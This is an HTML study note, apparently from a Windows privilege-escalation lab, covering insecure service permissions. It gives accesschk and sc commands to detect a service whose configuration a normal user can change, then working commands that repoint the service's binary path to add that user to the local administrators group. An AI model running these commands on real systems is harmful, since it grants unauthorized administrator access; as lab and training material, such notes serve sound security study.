<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Overview (binPath)</title>
</head><body><span style="font-size: 15pt">(LOOK FOR THE ESCALATION BY BINARY PATH, BECAUSE SOME COMMANDS NEED TO BE ADDED)<br/>
<br/>
</span><b><span style="font-size: 20pt"><div style="text-align: center"><span style="color: #ffa300">Detection</span></div></span></b><span style="font-size: 15pt"><br/>
</span><span style="font-size: 15pt"><br/>
<b>Windows VM</b><br/>
<br/>
1. Open command prompt and type:<br/>
<b>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc</b>&nbsp;<b>Everyone *</b><br/>
<b>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc</b><br/>
<br/>
2. Notice that the output suggests that the user <b>“User-PC\User”</b>&nbsp;has the <b>“SERVICE_CHANGE_CONFIG”</b>&nbsp;permission.<br/>
<br/>
3. Query for the service configuration:<br/>
<b>sc qc daclsvc</b><br/>
<br/>
<br/>
</span><b><span style="font-size: 20pt"><div style="text-align: center"><span style="color: #ff0000">Exploitation</span></div></span></b><span style="font-size: 15pt"><br/>
</span><span style="font-size: 15pt"><br/>
<b>Windows VM<br/>
</b><br/>
1. In command prompt type:<br/>
<b>sc config daclsvc binpath= "net localgroup administrators user /add"<br/>
</b><b>(The space after the equal sign is important!)</b><br/>
2. In command prompt type:<br/>
<b>sc start daclsvc</b><br/>
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:<br/>
<b>net localgroup administrators</b></span></body></html>